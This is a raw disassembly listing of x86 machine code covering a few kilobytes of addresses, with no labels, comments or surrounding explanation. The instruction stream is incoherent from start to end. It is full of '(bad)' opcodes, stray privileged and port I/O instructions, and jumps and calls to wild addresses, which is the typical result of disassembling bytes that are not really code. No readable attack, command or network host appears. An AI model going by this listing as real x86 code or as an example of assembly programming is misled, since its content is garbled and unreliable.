  40468d:	mov    ecx,0xc3b73eff
  404692:	adc    cl,ch
  404694:	ret    0xec89
  404697:	push   0x1b
  404699:	or     eax,0x836d9d00
  40469e:	jge    0x40468d
  4046a0:	stc    
  4046a1:	sbb    BYTE PTR [esi],dl
  4046a3:	push   ss
  4046a4:	add    esi,ebp
  4046a6:	(bad)  
  4046a7:	xchg   esp,eax
  4046a8:	add    DWORD PTR [ebp+0x621900ae],ebp
  4046ae:	(bad)  
  4046af:	dec    esi
  4046b1:	or     eax,0x6a5b75ff
  4046b6:	add    eax,0xc96324db
  4046bb:	ret    0x227
  4046be:	push   ebp
  4046bf:	mov    esi,DWORD PTR [edi]
  4046c1:	xchg   esp,eax
  4046c3:	lock inc esp
  4046c5:	std    
  4046c6:	or     ebp,eax
  4046c8:	in     al,0x65
  4046ca:	(bad)  
  4046cb:	inc    DWORD PTR [eax]
	...
  4046dd:	add    BYTE PTR [edx-0x397cf3b4],cl
  4046e3:	hlt    
  4046e4:	push   DWORD PTR [ebx-0x23]
  4046e7:	popa   
  4046e8:	jne    0x4046f6
  4046ea:	mov    ebx,0x94ffe2ce
  4046ef:	push   cs
  4046f0:	shl    BYTE PTR [ecx+edx*1+0x74],0x45
  4046f5:	lock and esp,DWORD PTR [edx+0x75]
  4046f9:	or     al,0x7b
  4046fb:	xchg   ebx,esp
  4046fd:	push   DWORD PTR [esi+ecx*1-0x40]
  404701:	je     0x404684
  404703:	mov    BYTE PTR [ebp-0x4],bh
  404706:	rol    DWORD PTR [ecx],cl
  404708:	adc    BYTE PTR [eax],al
  40470a:	mov    al,0xa1
  40470c:	(bad)  
  40470d:	jne    0x404726
  40470f:	arpl   WORD PTR [ebp-0x8],si
  404712:	dec    ebx
  404713:	popf   
  404714:	out    0xff,al
  404716:	inc    esp
  404717:	xadd   BYTE PTR [ebp-0x6e],dh
  40471b:	bound  esi,QWORD PTR [ebp+0x10]
  40471e:	xor    al,0xfd
  404720:	sti    
  404721:	dec    DWORD PTR [esi+0x79]
  404724:	push   DWORD PTR [ebp-0x65]
  404727:	imul   ecx,DWORD PTR [edi-0x1],0x458d6324
  40472e:	adc    edx,edx
  404730:	out    0xe0,eax
  404732:	lock (bad) 
  404734:	(bad)  
  404735:	(bad)  
  404736:	cli    
  404737:	or     BYTE PTR [edi],0xe8
  40473a:	mov    ds:0x43ffa1f0,eax
  40473f:	jmp    0x404752
	...
  404754:	scas   eax,DWORD PTR es:[edi]
  404755:	adc    ch,BYTE PTR [edi-0x5e64c97d]
  40475b:	jne    0x404763
  40475d:	add    al,0xb1
  40475f:	loop   0x40478e
  404761:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404762:	mov    eax,DWORD PTR [ebp-0xa]
  404765:	sub    bl,BYTE PTR [edi]
  404767:	or     al,0xfa
  404769:	aas    
  40476a:	dec    ecx
  40476b:	dec    DWORD PTR [edi+0x185aabbf]
  404771:	(bad)  
  404772:	mov    eax,ds:0xd4d73a0b
  404777:	mov    WORD PTR [edi+0x6fff345b],?
  40477d:	mov    edx,0x63d911ab
  404782:	mov    eax,ds:0xe4f2ba0b
  404787:	sbb    BYTE PTR [edi+0x72],0x4
  40478b:	add    dl,ch
  40478d:	lods   eax,DWORD PTR ds:[esi]
  40478e:	adc    al,0x11
  404790:	int    0x99
  404792:	repz dec BYTE PTR [edi+0x1a]
  404796:	mov    eax,ds:0x1713c275
  40479b:	or     BYTE PTR [edx-0x52005de7],ah
  4047a1:	adc    DWORD PTR [edi-0x10],eax
  4047a4:	dec    edx
  4047a5:	ss and ah,bl
  4047a8:	popf   
  4047a9:	xor    esp,DWORD PTR [ecx+0x49460675]
  4047af:	fisttp QWORD PTR [ebp-0x93d34bd]
  4047b5:	lods   eax,DWORD PTR ds:[esi]
  4047b6:	mov    eax,DWORD PTR ss:[eax]
	...
  4047c9:	add    BYTE PTR [esi-0x360f37d1],cl
  4047cf:	push   es
  4047d0:	mov    ebp,0xf104e7ff
  4047d5:	stos   DWORD PTR es:[edi],eax
  4047d6:	jae    0x40477f
  4047d8:	push   ds
  4047d9:	mov    eax,ds:0x84e14273
  4047de:	xlat   BYTE PTR ds:[ebx]
  4047df:	or     al,0xe9
  4047e1:	pop    ss
  4047e2:	mov    ah,0x9b
  4047e4:	jl     0x4047f1
  4047e6:	push   edx
  4047e7:	xchg   edx,eax
  4047e8:	or     BYTE PTR [ecx+0x1829103d],ah
  4047ee:	call   0xcad3ec7c
  4047f3:	fwait
  4047f4:	pop    esp
  4047f5:	or     al,0x12
  4047f7:	imul   ecx,ebx,0xa9101da0
  4047fd:	pop    ss
  4047fe:	fadd   DWORD PTR [ebp+0x4faa04c]
  404804:	fld    DWORD PTR [ebx]
  404806:	mov    esp,esi
  404808:	mov    ebp,0x3c9bfe16
  40480d:	pushf  
  40480e:	loop   0x4047eb
  404810:	(bad)  
  404811:	mov    al,ds:0x17a90fed
  404816:	sti    
  404817:	inc    edi
  404818:	ins    BYTE PTR es:[edi],dx
  404819:	inc    esi
  40481a:	jmp    0x8e9b:0xd8fd8134
  404821:	mov    al,ds:0xa4910d47
  404826:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404827:	fwait
  404828:	jle    0x4047b6
  40482a:	mov    ecx,0xc5a03f
	...
  40483f:	add    dh,bh
  404841:	add    al,0x14
  404843:	lea    ebx,[esi-0x5ba8d27b]
  404849:	fwait
  40484a:	pop    esi
  40484b:	enter  0x5c77,0x57
  40484f:	mov    al,ds:0x3e90495
  404854:	cli    
  404855:	(bad)  
  404856:	lods   al,BYTE PTR ds:[esi]
  404857:	psllw  mm0,mm4
  40485a:	mov    ch,0x6
  40485c:	jp     0x40483a
  40485e:	(bad)  
  40485f:	call   0xb2294a70
  404864:	clc    
  404865:	add    al,0x0
  404867:	es or  al,0x9
  40486a:	call   0xffdbdab7
  40486f:	loop   0x4048aa
  404871:	adc    DWORD PTR [edi],ecx
  404873:	sbb    eax,0x9ae940e8
  404879:	adc    DWORD PTR [ecx+edx*1],ecx
  40487c:	pop    ebx
  40487d:	mov    ebx,0x961f6ff
  404882:	push   0x441d47
  404887:	out    0x3,al
  404889:	or     eax,ebp
  40488b:	push   cs
  40488c:	push   esi
  40488d:	fwait
  40488e:	jmp    DWORD PTR [eax-0x7d]
  404891:	pop    esp
  404892:	dec    dh
  404894:	ins    DWORD PTR es:[edi],dx
  404895:	sub    al,0x3e
  404897:	call   0x64cd4d95
  40489c:	cmp    BYTE PTR [edx-0x52d14901],bl
  4048a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048a3:	lea    eax,[eax]
	...
  4048b5:	add    BYTE PTR [ebp-0x47937266],cl
  4048bb:	fwait
  4048bc:	call   FWORD PTR [esi+0x51b59a26]
  4048c2:	je     0x40485e
  4048c4:	inc    DWORD PTR [ecx-0x16ff9767]
  4048ca:	jbe    0x40484c
  4048cc:	mov    esp,0x409a5d7f
  4048d1:	out    0x7d,al
  4048d3:	inc    DWORD PTR [eax]
  4048d5:	jmp    0x2bd5d0d3
  4048da:	test   BYTE PTR [edx-0xb07a901],bl
  4048e0:	(bad)  
  4048e1:	call   0x6ac452df
  4048e6:	test   BYTE PTR [eax+eax*1],0x0
  4048ea:	push   cs
  4048eb:	inc    edi
  4048ec:	sub    al,0x50
  4048ee:	stos   DWORD PTR es:[edi],eax
  4048ef:	sbb    ch,BYTE PTR [ecx+eax*2]
  4048f2:	arpl   WORD PTR [esi-0x44],bp
  4048f5:	lods   eax,DWORD PTR ds:[esi]
  4048f6:	arpl   WORD PTR [esi],ax
  4048f8:	or     eax,eax
  4048fa:	xchg   BYTE PTR ds:0x653cce9,cl
  404900:	add    BYTE PTR [ebp-0x1392a],cl
  404906:	cld    
  404907:	jae    0x40494b
  404909:	sub    al,0x63
  40490b:	out    dx,al
  40490c:	popf   
  40490d:	sub    al,0x92
  40490f:	push   es
  404910:	call   0x4107b4
  404915:	or     esp,ebx
  404917:	sti    
  404918:	add    al,0xe9
	...
  40492a:	add    BYTE PTR [eax],al
  40492c:	mov    WORD PTR [esi],es
  40492e:	add    BYTE PTR [eax],al
  404930:	cmp    al,0xfd
  404932:	or     ebp,eax
  404934:	cs pusha 
  404936:	(bad)  
  404937:	call   FWORD PTR [eax]
  404939:	(bad)  
  40493a:	jne    0x40494b
  40493c:	stos   DWORD PTR es:[edi],eax
  40493d:	xor    BYTE PTR [eax],ch
  40493f:	inc    ecx
  404940:	adc    edi,DWORD PTR [ebx+0x75]
  404943:	or     al,0xbb
  404945:	sbb    ebx,edi
  404947:	call   FWORD PTR [esi+ebp*2+0x7ad36a0a]
  40494e:	jne    0x40495c
  404950:	mov    eax,DWORD PTR [edi+0x746cffdf]
  404956:	xchg   ebp,eax
  404957:	ret    0x7a7d
  40495a:	dec    DWORD PTR [ebp+0x505194e1]
  404960:	imul   edx,DWORD PTR [ebx-0x21],0xffffffff
  404964:	sub    al,0xd6
  404966:	(bad)  
  404967:	jne    0x404934
  404969:	jp     0x4049e0
  40496b:	adc    al,0x1c
  40496d:	std    
  40496e:	(bad)  
  404970:	cmp    al,0xfd
  404972:	pop    es
  404973:	call   0xffdd8572
  404978:	lea    eax,[ebx-0x3a]
  40497b:	fild   DWORD PTR [ebp+0x6f60aa42]
  404981:	ins    DWORD PTR es:[edi],dx
  404982:	out    dx,eax
  404983:	mov    BYTE PTR [edi+0x17],bh
  404986:	popf   
  404987:	jmp    FWORD PTR [ebp+0x2e]
  40498a:	and    BYTE PTR [eax],dl
  40498c:	cli    
  40498d:	js     0x404990
  40498f:	jmp    0x404991
	...
  4049a1:	add    BYTE PTR [eax],cl
  4049a3:	sti    
  4049a4:	pop    ss
  4049a5:	adc    BYTE PTR [ebp+0x38],dl
  4049a8:	push   edi
  4049a9:	dec    BYTE PTR [ebp+0xa]
  4049ac:	stos   DWORD PTR es:[edi],eax
  4049ad:	inc    edx
  4049ae:	xchg   esp,eax
  4049af:	stos   DWORD PTR es:[edi],eax
  4049b0:	add    ecx,DWORD PTR [ebx]
  4049b2:	cmp    cl,BYTE PTR [edi]
  4049b4:	loopne 0x404a1d
  4049b6:	push   0xffffffc3
  4049b8:	inc    esp
  4049b9:	add    BYTE PTR ds:0xeee80f10,ch
  4049bf:	ret    0xff9d
  4049c2:	sbb    eax,0x15fe5870
  4049c7:	mov    dl,0x34
  4049c9:	call   0xffddb45c
  4049ce:	stos   BYTE PTR es:[edi],al
  4049cf:	cs pop ds
  4049d1:	sbb    dl,bh
  4049d3:	iret   
  4049d4:	ud0    ebp,DWORD PTR [edi-0x46]
  4049d8:	xor    edi,edi
  4049da:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4049dc:	pushf  
  4049dd:	push   ebp
  4049de:	add    dh,BYTE PTR [ebx+0x10]
  4049e1:	jmp    DWORD PTR [edi-0x6e]
  4049e4:	xor    edi,edi
  4049e6:	dec    edi
  4049e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049e8:	stos   DWORD PTR es:[edi],eax
  4049e9:	push   esp
  4049ea:	iret   
  4049eb:	xchg   DWORD PTR [ebp-0x629ca018],ebx
  4049f1:	jmp    FWORD PTR [edi+0x21]
  4049f4:	ret    0xb5fe
  4049f7:	sysenter 
  4049f9:	jmp    DWORD PTR [edi-0x16]
  4049fc:	popf   
  4049fd:	jmp    DWORD PTR [ebp+0x4eb95105]
  404a03:	add    eax,0x86e9
	...
  404a18:	mov    edx,0x8c936c08
  404a1d:	cwde   
  404a1e:	dec    esi
  404a1f:	popf   
  404a20:	dec    edi
  404a21:	pop    ecx
  404a22:	inc    edi
  404a23:	popf   
  404a24:	jge    0x4049d3
  404a26:	das    
  404a27:	jo     0x404a23
  404a29:	add    al,0x36
  404a2b:	push   edi
  404a2c:	mov    dl,0x97
  404a2e:	cs popf 
  404a30:	push   edx
  404a31:	rol    BYTE PTR [ecx-0x63],cl
  404a34:	pop    ebp
  404a35:	into   
  404a36:	sub    edi,eax
  404a38:	push   ebp
  404a39:	xor    DWORD PTR [edx-0x50],esp
  404a3c:	loopne 0x404a42
  404a3e:	push   cs
  404a3f:	pop    ss
  404a40:	out    dx,al
  404a41:	xchg   edi,eax
  404a42:	jl     0x404a37
  404a44:	cmp    al,0x12
  404a46:	in     eax,dx
  404a47:	pushf  
  404a48:	scas   eax,DWORD PTR es:[edi]
  404a49:	or     al,0x1
  404a4b:	(bad)  [edi]
  404a4d:	cwde   
  404a4e:	out    dx,al
  404a4f:	retf   0xf538
  404a52:	call   0xdee9bb8d
  404a57:	push   ss
  404a58:	push   es
  404a59:	lods   eax,DWORD PTR ds:[esi]
  404a5a:	xor    bh,BYTE PTR [ebp-0x3c1d67f3]
  404a60:	mov    ?,esi
  404a62:	lds    edx,FWORD PTR [esi]
  404a64:	jmp    0xb697:0xd491d134
  404a6b:	xor    ebp,ebp
  404a6d:	adc    ecx,edx
  404a6f:	pushf  
  404a70:	outs   dx,DWORD PTR ds:[esi]
  404a71:	icebp  
  404a72:	cmp    BYTE PTR [ebp+0x5d910d67],bl
  404a78:	aad    0x97
  404a7a:	xchg   esi,eax
  404a7b:	stos   DWORD PTR es:[edi],eax
	...
  404a8c:	add    BYTE PTR [eax],al
  404a8e:	loopne 0x404a4a
  404a90:	mov    ds,WORD PTR [ebx+esi*4+0x2703ddc2]
  404a97:	mov    WORD PTR [ebp-0xed064],cs
  404a9d:	jne    0x404aa3
  404a9f:	cmc    
  404aa0:	(bad)  
  404aa1:	hlt    
  404aa2:	cmc    
  404aa3:	sub    bl,BYTE PTR [edx]
  404aa5:	data16 add al,0xd
  404aa8:	call   0xffd7c14d
  404aad:	push   esi
  404aae:	in     al,0xf0
  404ab0:	(bad)  
  404ab1:	aam    0x89
  404ab3:	xchg   esi,eax
  404ab4:	jne    0x404aab
  404ab6:	shl    ebx,cl
  404ab8:	(bad)  
  404ab9:	mov    ah,0x1
  404abb:	lods   eax,DWORD PTR ds:[esi]
  404abc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404abd:	mov    ss,WORD PTR ss:[edi-0x69924b01]
  404ac4:	jne    0x404abf
  404ac6:	jle    0x404ad9
  404ac8:	or     al,0x93
  404aca:	push   ebp
  404acb:	xchg   esi,eax
  404acc:	jne    0x404aaf
  404ace:	mov    eax,ds:0x660eff73
  404ad3:	int    0xc2
  404ad5:	fyl2xp1 
  404ad7:	xor    DWORD PTR [ebx-0xf3f85f3],ecx
  404add:	call   0x4172:0x122b2fe7
  404ae4:	or     al,0xe6
  404ae6:	inc    esi
  404ae7:	xchg   BYTE PTR [ebp-0x1f],al
  404aea:	jno    0x404afd
  404aec:	or     BYTE PTR [esi-0x45],ah
  404aef:	cwde   
  404af0:	(bad)  
  404af1:	and    al,0x0
	...
  404b03:	add    BYTE PTR [edx+0x4],ch
  404b06:	add    cl,ch
  404b08:	stc    
  404b09:	cmp    DWORD PTR ds:0x45e708,0xffffffe9
  404b10:	std    
  404b11:	cmp    BYTE PTR [ebx+0x7404f62c],al
  404b17:	aas    
  404b18:	jae    0x404b5a
  404b1a:	lock cmp DWORD PTR [esp+eax*1],esp
  404b1e:	push   0xffffffe9
  404b20:	pop    ds
  404b21:	add    eax,0x96ce0c83
  404b26:	jae    0x404b28
  404b28:	into   
  404b29:	jnp    0x404ba0
  404b2b:	adc    BYTE PTR [eax-0x6ff9601],cl
  404b31:	add    BYTE PTR [ebp-0x12ed4bb],cl
  404b37:	adc    eax,0x40a7f2
  404b3c:	mov    dl,al
  404b3e:	je     0x404b6f
  404b40:	and    ah,bh
  404b42:	repz add BYTE PTR [edi-0x78ba7557],ch
  404b49:	xchg   DWORD PTR [ebp-0x10],ecx
  404b4c:	clc    
  404b4d:	or     BYTE PTR [edi+0x17],dh
  404b50:	mov    al,ds:0x2f758b6e
  404b55:	xchg   BYTE PTR [ebp+0x8],bh
  404b58:	call   0x62243ba8
  404b5d:	outs   dx,DWORD PTR ds:[esi]
  404b5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404b5f:	mov    ebx,DWORD PTR [esi-0x1c8a0102]
  404b65:	mov    DWORD PTR [eax],eax
  404b67:	inc    DWORD PTR [eax]
	...
  404b79:	add    BYTE PTR [esi-0x37c8177b],bh
  404b7f:	add    BYTE PTR [eax],al
  404b81:	mov    esp,eax
  404b83:	fstp   DWORD PTR [ebp+0x5b]
  404b86:	fidivr DWORD PTR [esi-0x7a21fff4]
  404b8c:	in     al,dx
  404b8d:	sbb    DWORD PTR [edi+0x6e],0x53
  404b91:	push   esi
  404b92:	int3   
  404b93:	call   0x1127ad8
  404b98:	call   0x42b436
  404b9d:	mov    ebx,DWORD PTR [ebx-0x1c03ba3e]
  404ba3:	add    DWORD PTR [eax],eax
  404ba5:	add    al,bl
  404ba7:	shl    DWORD PTR [esi+edi*1+0xb],0xac
  404bac:	cs inc ecx
  404bae:	jecxz  0x404b7e
  404bb0:	out    0x45,eax
  404bb2:	cli    
  404bb3:	inc    edx
  404bb4:	add    eax,DWORD PTR [eax]
  404bb6:	icebp  
  404bb7:	imul   ecx,DWORD PTR [edi],0x2f
  404bba:	jno    0x404bd7
  404bbc:	sub    ecx,DWORD PTR [esi-0x1b]
  404bbf:	in     al,dx
  404bc0:	add    edx,DWORD PTR [ebx-0x5e]
  404bc3:	push   edi
  404bc4:	outs   dx,BYTE PTR ds:[esi]
  404bc5:	add    dl,bh
  404bc7:	mov    ds:0x12fc74c3,al
  404bcc:	fwait
  404bcd:	lea    edi,[edi]
  404bcf:	cmp    BYTE PTR [ebx],dh
  404bd1:	call   0x43cea5
  404bd6:	sub    al,BYTE PTR [edi-0x4e]
  404bd9:	cmp    edi,0x3f
  404bdc:	add    esi,DWORD PTR [eax+eax*1+0x0]
	...
  404bf0:	add    BYTE PTR [esp+eax*1+0x3aabfa00],al
  404bf7:	pop    esi
  404bf8:	shl    esp,0xc5
  404bfb:	mov    eax,0x3abfa
  404c00:	mov    ch,0x55
  404c02:	ds leave 
  404c04:	cmp    DWORD PTR [eax-0x72],ebx
  404c07:	in     al,dx
  404c08:	jns    0x404be9
  404c0a:	xchg   edx,eax
  404c0b:	cmp    edi,0x4c
  404c0e:	jmp    0xfec4653
  404c13:	adc    bh,BYTE PTR [ecx+0x50]
  404c16:	pusha  
  404c17:	cs mov ebx,0xf37403ab
  404c1d:	sub    dl,bh
  404c1f:	test   al,0xe4
  404c21:	in     al,dx
  404c22:	add    eax,DWORD PTR [eax]
  404c24:	xchg   DWORD PTR [esi-0x5405fea5],esp
  404c2a:	add    ecx,ecx
  404c2c:	cmp    DWORD PTR [eax],edx
  404c2e:	aas    
  404c2f:	cli    
  404c30:	mov    esp,0x3ac6039e
  404c35:	popf   
  404c36:	add    eax,esi
  404c38:	cmp    ah,BYTE PTR [eax+0x53ac603]
  404c3e:	jmp    0xb403:0xe545bc03
  404c45:	inc    ebp
  404c46:	in     al,dx
  404c47:	(bad)  
  404c48:	jbe    0x404c94
  404c4a:	xchg   ebp,eax
  404c4b:	xor    al,0x50
  404c4d:	add    eax,0x5200413
  404c52:	adc    eax,DWORD PTR [eax+eax*1]
	...
  404c65:	add    BYTE PTR [eax],ah
  404c67:	add    eax,0xe5120403
  404c6c:	jmp    0xf82e:0x91efa03
  404c73:	and    DWORD PTR [ebp+ebx*4+0x62fc942a],0xce945d4
  404c7e:	mov    edx,0x39caeb1a
  404c83:	int3   
  404c84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404c85:	xchg   ebx,eax
  404c86:	cli    
  404c87:	add    al,0xe9
  404c89:	add    esi,DWORD PTR [edi+0x4a]
  404c8c:	cmp    DWORD PTR [ebx*2-0x5d1e2e6],esi
  404c93:	xchg   ebx,eax
  404c94:	hlt    
  404c95:	pop    esi
  404c96:	sbb    al,0x46
  404c98:	jmp    0xe65a86a9
  404c9d:	shl    BYTE PTR [edi-0x5fc166c],0x4
  404ca4:	dec    BYTE PTR [esi]
  404ca6:	es xchg esp,eax
  404ca8:	fsubr  QWORD PTR [edx-0x2c]
  404cab:	inc    ebp
  404cac:	jmp    0xb0d5043d
  404cb1:	les    ebp,FWORD PTR [edi+0x3684cd7f]
  404cb7:	jge    0x404d1d
  404cb9:	ds jb  0x404cf1
  404cbc:	inc    ecx
  404cbd:	(bad)  
  404cbe:	int3   
  404cbf:	inc    ebp
  404cc0:	jmp    0xbeeb8870
  404cc5:	cwde   
  404cc6:	dec    edx
  404cc7:	add    BYTE PTR [eax],al
  404cc9:	test   eax,0x0
	...
  404cda:	add    BYTE PTR [eax],al
  404cdc:	cmc    
  404cdd:	or     al,BYTE PTR [ebx+0x76f86e2c]
  404ce3:	adc    bh,BYTE PTR [ebp+0x49]
  404ce6:	lock cmp DWORD PTR [esi-0x616550e],ebx
  404ced:	mov    eax,eax
  404cef:	adc    DWORD PTR [eax],eax
  404cf1:	add    al,0xb6
  404cf3:	sub    al,0x93
  404cf5:	xor    al,0xf
  404cf7:	aaa    
  404cf8:	in     al,dx
  404cf9:	xchg   edx,eax
  404cfa:	push   eax
  404cfb:	out    0x4b,al
  404cfd:	dec    edx
  404cfe:	std    
  404cff:	sbb    ebx,esi
  404d01:	pop    edx
  404d02:	inc    ebp
  404d03:	gs leave 
  404d05:	add    esi,DWORD PTR [esi+0xf346ea4]
  404d0b:	lahf   
  404d0c:	les    ecx,FWORD PTR [esi+0x4a2bde50]
  404d12:	stc    
  404d13:	cdq    
  404d14:	add    bl,BYTE PTR [ebx+0x45]
  404d17:	inc    ecx
  404d18:	sub    DWORD PTR [edi+esi*4],eax
  404d1b:	lods   al,BYTE PTR ds:[esi]
  404d1c:	mov    esi,DWORD PTR [edi+ecx*1]
  404d1f:	jbe    0x404d3d
  404d21:	cdq    
  404d22:	push   eax
  404d23:	es add al,0x95
  404d26:	push   0x446323
  404d2b:	fs add al,0x81
  404d2e:	push   eax
  404d2f:	add    DWORD PTR [edx+0x7ee9005e],edx
  404d35:	enter  0x6c34,0xec
  404d39:	adc    BYTE PTR [eax+0x1],0xa2
  404d3d:	pop    ebp
  404d3e:	add    cl,ch
	...
  404d50:	add    BYTE PTR [eax],al
  404d52:	jmp    0xceb592d8
  404d57:	sbb    al,0xf5
  404d59:	movzx  eax,WORD PTR [eax+ebp*8]
  404d5d:	cwde   
  404d5e:	pop    edx
  404d5f:	xchg   ebx,eax
  404d60:	inc    ecx
  404d62:	jge    0x404d10
  404d64:	inc    DWORD PTR [eax]
  404d66:	mov    esp,0x6855c3c0
  404d6b:	pop    ebp
  404d6c:	add    esp,0xffff79ff
  404d72:	add    dl,ah
  404d74:	imul   eax,DWORD PTR [eax],0x75ff08e9
  404d7a:	retf   
  404d7b:	pop    esi
  404d7c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404d7d:	aad    0x6c
  404d7f:	jp     0x404d0a
  404d81:	inc    ebp
  404d82:	outs   dx,DWORD PTR ds:[esi]
  404d83:	loope  0x404d85
  404d85:	add    BYTE PTR [ebx+edi*1+0x5eab75ff],cl
  404d8c:	out    0xd4,eax
  404d8e:	sub    al,0x7a
  404d90:	push   0x6939c
  404d95:	lea    esp,[esi]
  404d97:	jmp    0xd96d4d9a
  404d9c:	out    0x7b,eax
  404d9e:	retf   
  404d9f:	jns    0x404da0
  404da1:	(bad)  
  404da2:	push   ss
  404da3:	jmp    0xcfd4da6
  404da8:	add    BYTE PTR [eax],al
  404daa:	arpl   WORD PTR [ebp-0x7b],di
  404dad:	pusha  
  404dae:	sub    al,0x7a
  404db0:	call   DWORD PTR [eax-0x45]
  404db3:	push   edi
  404db4:	test   eax,0x0
	...
  404dc5:	add    BYTE PTR [eax],al
  404dc7:	add    BYTE PTR [ebx-0x61],ah
  404dca:	enter  0x112b,0x7c
  404dce:	mov    ebp,0xff79ec74
  404dd3:	jmp    0x404e15
  404dd5:	xchg   BYTE PTR [edi],bh
  404dd7:	add    BYTE PTR [esi+0x2301ba04],dh
  404ddd:	push   es
  404dde:	add    BYTE PTR [ebx],cl
  404de0:	add    ebp,esi
  404de2:	add    al,dh
  404de4:	adc    al,0x6
  404de6:	inc    edi
  404de7:	inc    ecx
  404de8:	mov    ds:0x23008070,al
  404ded:	push   es
  404dee:	jb     0x404dd5
  404df0:	cli    
  404df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404df2:	ret    
  404df3:	je     0x404dd9
  404df5:	inc    ebx
  404df6:	js     0x404df8
  404df8:	cli    
  404df9:	fwait
  404dfa:	mov    BYTE PTR [ebp-0x69aca6],al
  404e00:	dec    edx
  404e01:	pop    ebx
  404e02:	adc    BYTE PTR [eax],cl
  404e04:	rcr    BYTE PTR [edx],cl
  404e06:	scas   eax,DWORD PTR es:[edi]
  404e07:	call   ebp
  404e09:	jbe    0x404e12
  404e0b:	push   0xfffffffa
  404e0d:	cmc    
  404e0e:	add    edi,edi
  404e10:	dec    edi
  404e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e12:	stos   DWORD PTR es:[edi],eax
  404e13:	test   eax,0xe89682a6
  404e18:	(bad)  
  404e19:	mov    BYTE PTR [esi+0x10134aff],dl
  404e1f:	or     BYTE PTR [edx-0x62005000],dl
  404e25:	add    eax,DWORD PTR [esp+eax*1]
  404e28:	cli    
  404e29:	fwait
  404e2a:	stos   DWORD PTR es:[edi],eax
  404e2b:	jmp    0x404e30
	...
  404e3c:	add    BYTE PTR [eax],al
  404e3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404e3f:	xor    dl,BYTE PTR [esi-0x69a88077]
  404e45:	(bad)  
  404e46:	jge    0x404e0b
  404e48:	xchg   esi,eax
  404e49:	add    edi,edx
  404e4b:	fwait
  404e4c:	xchg   esi,eax
  404e4d:	mov    ch,0xce
  404e4f:	rcl    BYTE PTR [ebp-0xc622d01],cl
  404e55:	call   FWORD PTR [ebp-0x3d]
  404e58:	add    eax,DWORD PTR [edx+edi*8]
  404e5b:	fwait
  404e5c:	stos   DWORD PTR es:[edi],eax
  404e5d:	push   edx
  404e5e:	mov    ds:0x4550039b,eax
  404e63:	xor    BYTE PTR [edi],dh
  404e65:	(bad)  
  404e66:	cmp    eax,0x2759602
  404e6b:	hlt    
  404e6c:	and    ah,dl
  404e6e:	sub    eax,0xf9ff2a92
  404e73:	fwait
  404e74:	add    edi,edi
  404e76:	addr16 jg 0x404e0f
  404e79:	call   DWORD PTR ds:0xea035104
  404e7f:	add    al,0xe9
  404e81:	sub    edi,edx
  404e83:	or     cl,ch
  404e85:	add    edx,DWORD PTR [edx]
  404e87:	fstp   TBYTE PTR [edi+0x4]
  404e8a:	cli    
  404e8b:	xor    al,0xc6
  404e8d:	dec    edi
  404e8e:	dec    esi
  404e8f:	nop
  404e90:	mov    esi,0xe11ae595
  404e95:	stos   DWORD PTR es:[edi],eax
  404e96:	and    edi,DWORD PTR [ecx-0x351d6a52]
  404e9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e9d:	xchg   ebp,eax
  404e9e:	int    0x35
  404ea0:	sahf   
  404ea1:	sldt   WORD PTR [eax]
	...
  404eb4:	repnz pushf 
  404eb6:	pushf  
  404eb7:	mov    cl,0xbd
  404eb9:	nop
  404eba:	xor    DWORD PTR [ebx],0x878690b4
  404ec0:	ja     0x404eef
  404ec2:	jle    0x404e59
  404ec4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404ec5:	xor    eax,0x45cc8f01
  404eca:	jmp    0x66e9be7a
  404ecf:	xchg   ebp,eax
  404ed0:	or     DWORD PTR [edx-0x6f7a6b4b],0x6a
  404ed7:	push   edi
  404ed8:	es nop
  404eda:	dec    esi
  404edb:	xchg   ebp,eax
  404edc:	cli    
  404edd:	sbb    BYTE PTR [eax+eax*4-0x6ac1d251],ch
  404ee4:	gs stc 
  404ee6:	mov    edx,0x918a78d7
  404eeb:	xchg   esp,eax
  404eec:	push   ebp
  404eed:	nop
  404eee:	in     eax,dx
  404eef:	xchg   esp,eax
  404ef0:	xchg   DWORD PTR ds:0x9045951e,ebp
  404ef6:	pushf  
  404ef7:	or     edx,DWORD PTR [edx+0x53]
  404efa:	cmp    dl,BYTE PTR [ebp+0x3c548435]
  404f00:	sub    eax,0x93fffe90
  404f05:	pop    DWORD PTR [eax]
  404f07:	imul   ah
  404f09:	cld    
  404f0a:	out    0x48,eax
  404f0c:	dec    ebx
  404f0d:	nop
  404f0e:	jmp    esi
  404f10:	mov    esp,0x6edeff2c
  404f15:	nop
  404f16:	mov    ch,0x3d
	...
  404f28:	add    BYTE PTR [eax],al
  404f2a:	addr16 nop
  404f2c:	dec    esi
  404f2e:	add    al,0xfd
  404f30:	out    0x8b,eax
  404f32:	stos   BYTE PTR es:[edi],al
  404f33:	(bad)  
  404f34:	call   edx
  404f36:	std    
  404f37:	sbb    al,BYTE PTR [eax]
  404f39:	inc    ebx
  404f3a:	test   BYTE PTR [edi+0x59a1e175],0xd3
  404f41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f42:	data16 (bad) 
  404f44:	mov    ch,0x35
  404f46:	outs   dx,DWORD PTR ds:[esi]
  404f47:	(bad)  
  404f48:	inc    DWORD PTR [ecx-0x7100496e]
  404f4e:	mov    ds,WORD PTR [ecx+0x5c]
  404f51:	xchg   BYTE PTR [esi+0x5789e88f],al
  404f57:	(bad)  
  404f58:	inc    edx
  404f5a:	bound  ebx,QWORD PTR [ecx+eax*2]
  404f5d:	mov    esi,0xd1e80538
  404f62:	and    DWORD PTR ds:0xe1047000,eax
  404f68:	(bad)  
  404f69:	push   esi
  404f6a:	cmp    WORD PTR [ebp-0x707103],0xffe9
  404f72:	std    
  404f73:	out    dx,al
  404f74:	addr16 or al,0x5f
  404f77:	inc    esp
